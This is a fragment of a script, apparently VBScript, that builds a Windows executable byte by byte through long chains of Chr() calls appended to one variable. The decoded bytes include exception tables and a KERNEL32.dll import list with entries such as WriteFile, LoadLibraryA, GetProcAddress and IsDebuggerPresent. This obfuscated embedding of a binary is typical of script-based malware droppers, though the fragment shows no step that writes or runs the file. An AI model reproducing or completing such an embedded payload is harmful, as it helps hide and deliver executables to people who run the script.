gfoN=gfoN&Chr(176)&Chr(146)&Chr(64)&Chr(0)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(38)&Chr(0)&Chr(0)&Chr(128)&Chr(80)&Chr(0)&Chr(0)&Chr(44)&Chr(104)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(136)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(145)&Chr(17)&Chr(64)&Chr(0)&Chr(149)&Chr(17)&Chr(64)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(87)&Chr(17)&Chr(64)&Chr(0)&Chr(107)&Chr(17)&Chr(64)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(200)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(140)&Chr(20)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(140)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(135)&Chr(31)&Chr(64)&Chr(0)&Chr(139)&Chr(31)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(34)&Chr(64)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(47)&Chr(34)&Chr(64)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(216)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(226)&Chr(35)&Chr(64)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(238)&Chr(35)&Chr(64)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(216)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(98)&Chr(40)&Chr(64)&Chr(0)&Chr(102)&Chr(40)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(41)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(255)&Chr(255)&Chr(255)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(14)&Chr(45)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(216)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(107)&Chr(46)&Chr(64)&Chr(0)&Chr(127)&Chr(46)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(192)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(109)&Chr(48)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(208)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(253)&Chr(48)&Chr(64)&Chr(0)&Chr(20)&Chr(49)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(56)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(204)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(204)&Chr(60)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(121)&Chr(61)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(14)&Chr(69)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(208)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(124)&Chr(83)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(226)&Chr(89)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(172)&Chr(91)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(208)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(17)&Chr(93)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(117)&Chr(95)&Chr(64)&Chr(0)&Chr(145)&Chr(95)&Chr(64)&Chr(0)
gfoN=gfoN&Chr(140)&Chr(149)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(148)&Chr(154)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(150)&Chr(0)&Chr(0)&Chr(134)&Chr(150)&Chr(0)&Chr(0)&Chr(152)&Chr(150)&Chr(0)&Chr(0)&Chr(182)&Chr(150)&Chr(0)&Chr(0)&Chr(202)&Chr(150)&Chr(0)&Chr(0)&Chr(210)&Chr(150)&Chr(0)&Chr(0)&Chr(228)&Chr(150)&Chr(0)&Chr(0)&Chr(242)&Chr(150)&Chr(0)&Chr(0)&Chr(254)&Chr(150)&Chr(0)&Chr(0)&Chr(14)&Chr(151)&Chr(0)&Chr(0)&Chr(36)&Chr(151)&Chr(0)&Chr(0)&Chr(62)&Chr(151)&Chr(0)&Chr(0)&Chr(86)&Chr(151)&Chr(0)&Chr(0)&Chr(112)&Chr(151)&Chr(0)&Chr(0)&Chr(134)&Chr(151)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(150)&Chr(151)&Chr(0)&Chr(0)&Chr(176)&Chr(151)&Chr(0)&Chr(0)&Chr(194)&Chr(151)&Chr(0)&Chr(0)&Chr(208)&Chr(151)&Chr(0)&Chr(0)&Chr(232)&Chr(151)&Chr(0)&Chr(0)&Chr(246)&Chr(151)&Chr(0)&Chr(0)&Chr(2)&Chr(152)&Chr(0)&Chr(0)&Chr(16)&Chr(152)&Chr(0)&Chr(0)&Chr(26)&Chr(152)&Chr(0)&Chr(0)&Chr(50)&Chr(152)&Chr(0)&Chr(0)&Chr(66)&Chr(152)&Chr(0)&Chr(0)&Chr(88)&Chr(152)&Chr(0)&Chr(0)&Chr(112)&Chr(152)&Chr(0)&Chr(0)&Chr(126)&Chr(152)&Chr(0)&Chr(0)&Chr(140)&Chr(152)&Chr(0)&Chr(0)&Chr(152)&Chr(152)&Chr(0)&Chr(0)&Chr(178)&Chr(152)&Chr(0)&Chr(0)&Chr(194)&Chr(152)&Chr(0)&Chr(0)&Chr(216)&Chr(152)&Chr(0)&Chr(0)&Chr(242)&Chr(152)&Chr(0)&Chr(0)&Chr(10)&Chr(153)&Chr(0)&Chr(0)&Chr(34)&Chr(153)&Chr(0)&Chr(0)&Chr(54)&Chr(153)&Chr(0)&Chr(0)&Chr(74)&Chr(153)&Chr(0)&Chr(0)&Chr(102)&Chr(153)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(122)&Chr(153)&Chr(0)&Chr(0)&Chr(138)&Chr(153)&Chr(0)&Chr(0)&Chr(178)&Chr(153)&Chr(0)&Chr(0)&Chr(190)&Chr(153)&Chr(0)&Chr(0)&Chr(200)&Chr(153)&Chr(0)&Chr(0)&Chr(212)&Chr(153)&Chr(0)&Chr(0)&Chr(230)&Chr(153)&Chr(0)&Chr(0)&Chr(242)&Chr(153)&Chr(0)&Chr(0)&Chr(2)&Chr(154)&Chr(0)&Chr(0)&Chr(16)&Chr(154)&Chr(0)&Chr(0)&Chr(28)&Chr(154)&Chr(0)&Chr(0)&Chr(40)&Chr(154)&Chr(0)&Chr(0)&Chr(58)&Chr(154)&Chr(0)&Chr(0)&Chr(74)&Chr(154)&Chr(0)&Chr(0)&Chr(96)&Chr(154)&Chr(0)&Chr(0)&Chr(112)&Chr(154)&Chr(0)&Chr(0)&Chr(130)&Chr(154)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(111)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(67)&Chr(111)&Chr(109)&Chr(109)&Chr(97)&Chr(110)&Chr(100)&Chr(76)&Chr(105)&Chr(110)&Chr(101)&Chr(65)&Chr(0)&Chr(57)&Chr(2)&Chr(71)&Chr(101)&Chr(116)&Chr(83)&Chr(116)&Chr(97)&Chr(114)&Chr(116)
gfoN=gfoN&Chr(117)&Chr(112)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(65)&Chr(0)&Chr(21)&Chr(4)&Chr(83)&Chr(101)&Chr(116)&Chr(85)&Chr(110)&Chr(104)&Chr(97)&Chr(110)&Chr(100)&Chr(108)&Chr(101)&Chr(100)&Chr(69)&Chr(120)&Chr(99)&Chr(101)&Chr(112)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(70)&Chr(105)&Chr(108)&Chr(116)&Chr(101)&Chr(114)&Chr(0)&Chr(249)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(77)&Chr(111)&Chr(100)&Chr(117)&Chr(108)&Chr(101)&Chr(72)&Chr(97)&Chr(110)&Chr(100)&Chr(108)&Chr(101)&Chr(87)&Chr(0)&Chr(0)&Chr(33)&Chr(4)&Chr(83)&Chr(108)&Chr(101)&Chr(101)&Chr(112)&Chr(0)&Chr(32)&Chr(2)&Chr(71)&Chr(101)&Chr(116)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(65)&Chr(100)&Chr(100)&Chr(114)&Chr(101)&Chr(115)&Chr(115)&Chr(0)&Chr(0)&Chr(4)&Chr(1)&Chr(69)&Chr(120)&Chr(105)&Chr(116)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(0)&Chr(141)&Chr(4)
gfoN=gfoN&Chr(87)&Chr(114)&Chr(105)&Chr(116)&Chr(101)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(0)&Chr(59)&Chr(2)&Chr(71)&Chr(101)&Chr(116)&Chr(83)&Chr(116)&Chr(100)&Chr(72)&Chr(97)&Chr(110)&Chr(100)&Chr(108)&Chr(101)&Chr(0)&Chr(0)&Chr(244)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(77)&Chr(111)&Chr(100)&Chr(117)&Chr(108)&Chr(101)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(78)&Chr(97)&Chr(109)&Chr(101)&Chr(65)&Chr(0)&Chr(0)&Chr(74)&Chr(1)&Chr(70)&Chr(114)&Chr(101)&Chr(101)&Chr(69)&Chr(110)&Chr(118)&Chr(105)&Chr(114)&Chr(111)&Chr(110)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(115)&Chr(65)&Chr(0)&Chr(191)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(69)&Chr(110)&Chr(118)&Chr(105)&Chr(114)&Chr(111)&Chr(110)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(115)&Chr(0)&Chr(75)&Chr(1)
gfoN=gfoN&Chr(70)&Chr(114)&Chr(101)&Chr(101)&Chr(69)&Chr(110)&Chr(118)&Chr(105)&Chr(114)&Chr(111)&Chr(110)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(115)&Chr(87)&Chr(0)&Chr(122)&Chr(4)&Chr(87)&Chr(105)&Chr(100)&Chr(101)&Chr(67)&Chr(104)&Chr(97)&Chr(114)&Chr(84)&Chr(111)&Chr(77)&Chr(117)&Chr(108)&Chr(116)&Chr(105)&Chr(66)&Chr(121)&Chr(116)&Chr(101)&Chr(0)&Chr(230)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(76)&Chr(97)&Chr(115)&Chr(116)&Chr(69)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(0)&Chr(0)&Chr(193)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(69)&Chr(110)&Chr(118)&Chr(105)&Chr(114)&Chr(111)&Chr(110)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(115)&Chr(87)&Chr(0)&Chr(0)&Chr(232)&Chr(3)&Chr(83)&Chr(101)&Chr(116)&Chr(72)&Chr(97)&Chr(110)&Chr(100)&Chr(108)&Chr(101)&Chr(67)
gfoN=gfoN&Chr(111)&Chr(117)&Chr(110)&Chr(116)&Chr(0)&Chr(0)&Chr(215)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(84)&Chr(121)&Chr(112)&Chr(101)&Chr(0)&Chr(190)&Chr(0)&Chr(68)&Chr(101)&Chr(108)&Chr(101)&Chr(116)&Chr(101)&Chr(67)&Chr(114)&Chr(105)&Chr(116)&Chr(105)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(101)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(0)&Chr(52)&Chr(4)&Chr(84)&Chr(108)&Chr(115)&Chr(71)&Chr(101)&Chr(116)&Chr(86)&Chr(97)&Chr(108)&Chr(117)&Chr(101)&Chr(0)&Chr(50)&Chr(4)&Chr(84)&Chr(108)&Chr(115)&Chr(65)&Chr(108)&Chr(108)&Chr(111)&Chr(99)&Chr(0)&Chr(0)&Chr(53)&Chr(4)&Chr(84)&Chr(108)&Chr(115)&Chr(83)&Chr(101)&Chr(116)&Chr(86)&Chr(97)&Chr(108)&Chr(117)&Chr(101)&Chr(0)&Chr(51)&Chr(4)&Chr(84)&Chr(108)&Chr(115)&Chr(70)&Chr(114)&Chr(101)&Chr(101)&Chr(0)&Chr(192)&Chr(2)&Chr(73)&Chr(110)&Chr(116)&Chr(101)
gfoN=gfoN&Chr(114)&Chr(108)&Chr(111)&Chr(99)&Chr(107)&Chr(101)&Chr(100)&Chr(73)&Chr(110)&Chr(99)&Chr(114)&Chr(101)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(0)&Chr(0)&Chr(236)&Chr(3)&Chr(83)&Chr(101)&Chr(116)&Chr(76)&Chr(97)&Chr(115)&Chr(116)&Chr(69)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(0)&Chr(0)&Chr(173)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(67)&Chr(117)&Chr(114)&Chr(114)&Chr(101)&Chr(110)&Chr(116)&Chr(84)&Chr(104)&Chr(114)&Chr(101)&Chr(97)&Chr(100)&Chr(73)&Chr(100)&Chr(0)&Chr(0)&Chr(188)&Chr(2)&Chr(73)&Chr(110)&Chr(116)&Chr(101)&Chr(114)&Chr(108)&Chr(111)&Chr(99)&Chr(107)&Chr(101)&Chr(100)&Chr(68)&Chr(101)&Chr(99)&Chr(114)&Chr(101)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(0)&Chr(0)&Chr(159)&Chr(2)&Chr(72)&Chr(101)&Chr(97)&Chr(112)&Chr(67)&Chr(114)&Chr(101)&Chr(97)&Chr(116)&Chr(101)&Chr(0)&Chr(0)&Chr(87)&Chr(4)&Chr(86)&Chr(105)&Chr(114)&Chr(116)
gfoN=gfoN&Chr(117)&Chr(97)&Chr(108)&Chr(70)&Chr(114)&Chr(101)&Chr(101)&Chr(0)&Chr(161)&Chr(2)&Chr(72)&Chr(101)&Chr(97)&Chr(112)&Chr(70)&Chr(114)&Chr(101)&Chr(101)&Chr(0)&Chr(0)&Chr(84)&Chr(3)&Chr(81)&Chr(117)&Chr(101)&Chr(114)&Chr(121)&Chr(80)&Chr(101)&Chr(114)&Chr(102)&Chr(111)&Chr(114)&Chr(109)&Chr(97)&Chr(110)&Chr(99)&Chr(101)&Chr(67)&Chr(111)&Chr(117)&Chr(110)&Chr(116)&Chr(101)&Chr(114)&Chr(0)&Chr(102)&Chr(2)&Chr(71)&Chr(101)&Chr(116)&Chr(84)&Chr(105)&Chr(99)&Chr(107)&Chr(67)&Chr(111)&Chr(117)&Chr(110)&Chr(116)&Chr(0)&Chr(0)&Chr(170)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(67)&Chr(117)&Chr(114)&Chr(114)&Chr(101)&Chr(110)&Chr(116)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(73)&Chr(100)&Chr(0)&Chr(79)&Chr(2)&Chr(71)&Chr(101)&Chr(116)&Chr(83)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(84)&Chr(105)&Chr(109)&Chr(101)&Chr(65)
gfoN=gfoN&Chr(115)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(84)&Chr(105)&Chr(109)&Chr(101)&Chr(0)&Chr(239)&Chr(2)&Chr(76)&Chr(101)&Chr(97)&Chr(118)&Chr(101)&Chr(67)&Chr(114)&Chr(105)&Chr(116)&Chr(105)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(101)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(0)&Chr(0)&Chr(217)&Chr(0)&Chr(69)&Chr(110)&Chr(116)&Chr(101)&Chr(114)&Chr(67)&Chr(114)&Chr(105)&Chr(116)&Chr(105)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(101)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(0)&Chr(0)&Chr(45)&Chr(4)&Chr(84)&Chr(101)&Chr(114)&Chr(109)&Chr(105)&Chr(110)&Chr(97)&Chr(116)&Chr(101)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(0)&Chr(0)&Chr(169)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(67)&Chr(117)&Chr(114)&Chr(114)&Chr(101)&Chr(110)&Chr(116)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(0)&Chr(62)&Chr(4)
gfoN=gfoN&Chr(85)&Chr(110)&Chr(104)&Chr(97)&Chr(110)&Chr(100)&Chr(108)&Chr(101)&Chr(100)&Chr(69)&Chr(120)&Chr(99)&Chr(101)&Chr(112)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(70)&Chr(105)&Chr(108)&Chr(116)&Chr(101)&Chr(114)&Chr(0)&Chr(0)&Chr(209)&Chr(2)&Chr(73)&Chr(115)&Chr(68)&Chr(101)&Chr(98)&Chr(117)&Chr(103)&Chr(103)&Chr(101)&Chr(114)&Chr(80)&Chr(114)&Chr(101)&Chr(115)&Chr(101)&Chr(110)&Chr(116)&Chr(0)&Chr(241)&Chr(2)&Chr(76)&Chr(111)&Chr(97)&Chr(100)&Chr(76)&Chr(105)&Chr(98)&Chr(114)&Chr(97)&Chr(114)&Chr(121)&Chr(65)&Chr(0)&Chr(0)&Chr(181)&Chr(2)&Chr(73)&Chr(110)&Chr(105)&Chr(116)&Chr(105)&Chr(97)&Chr(108)&Chr(105)&Chr(122)&Chr(101)&Chr(67)&Chr(114)&Chr(105)&Chr(116)&Chr(105)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(101)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(65)&Chr(110)&Chr(100)&Chr(83)&Chr(112)&Chr(105)&Chr(110)&Chr(67)&Chr(111)&Chr(117)&Chr(110)
gfoN=gfoN&Chr(116)&Chr(0)&Chr(91)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(67)&Chr(80)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(0)&Chr(82)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(65)&Chr(67)&Chr(80)&Chr(0)&Chr(0)&Chr(19)&Chr(2)&Chr(71)&Chr(101)&Chr(116)&Chr(79)&Chr(69)&Chr(77)&Chr(67)&Chr(80)&Chr(0)&Chr(0)&Chr(219)&Chr(2)&Chr(73)&Chr(115)&Chr(86)&Chr(97)&Chr(108)&Chr(105)&Chr(100)&Chr(67)&Chr(111)&Chr(100)&Chr(101)&Chr(80)&Chr(97)&Chr(103)&Chr(101)&Chr(0)&Chr(157)&Chr(2)&Chr(72)&Chr(101)&Chr(97)&Chr(112)&Chr(65)&Chr(108)&Chr(108)&Chr(111)&Chr(99)&Chr(0)&Chr(84)&Chr(4)&Chr(86)&Chr(105)&Chr(114)&Chr(116)&Chr(117)&Chr(97)&Chr(108)&Chr(65)&Chr(108)&Chr(108)&Chr(111)&Chr(99)&Chr(0)&Chr(0)&Chr(164)&Chr(2)&Chr(72)&Chr(101)&Chr(97)&Chr(112)&Chr(82)&Chr(101)&Chr(65)&Chr(108)&Chr(108)&Chr(111)&Chr(99)&Chr(0)&Chr(146)&Chr(3)&Chr(82)&Chr(116)
gfoN=gfoN&Chr(108)&Chr(85)&Chr(110)&Chr(119)&Chr(105)&Chr(110)&Chr(100)&Chr(0)&Chr(166)&Chr(2)&Chr(72)&Chr(101)&Chr(97)&Chr(112)&Chr(83)&Chr(105)&Chr(122)&Chr(101)&Chr(0)&Chr(0)&Chr(232)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(76)&Chr(111)&Chr(99)&Chr(97)&Chr(108)&Chr(101)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(65)&Chr(0)&Chr(0)&Chr(225)&Chr(2)&Chr(76)&Chr(67)&Chr(77)&Chr(97)&Chr(112)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(65)&Chr(0)&Chr(0)&Chr(26)&Chr(3)&Chr(77)&Chr(117)&Chr(108)&Chr(116)&Chr(105)&Chr(66)&Chr(121)&Chr(116)&Chr(101)&Chr(84)&Chr(111)&Chr(87)&Chr(105)&Chr(100)&Chr(101)&Chr(67)&Chr(104)&Chr(97)&Chr(114)&Chr(0)&Chr(227)&Chr(2)&Chr(76)&Chr(67)&Chr(77)&Chr(97)&Chr(112)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(87)&Chr(0)&Chr(0)&Chr(61)&Chr(2)&Chr(71)&Chr(101)&Chr(116)&Chr(83)&Chr(116)&Chr(114)
gfoN=gfoN&Chr(105)&Chr(110)&Chr(103)&Chr(84)&Chr(121)&Chr(112)&Chr(101)&Chr(65)&Chr(0)&Chr(0)&Chr(64)&Chr(2)&Chr(71)&Chr(101)&Chr(116)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(84)&Chr(121)&Chr(112)&Chr(101)&Chr(87)&Chr(0)&Chr(0)&Chr(75)&Chr(69)&Chr(82)&Chr(78)&Chr(69)&Chr(76)&Chr(51)&Chr(50)&Chr(46)&Chr(100)&Chr(108)&Chr(108)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
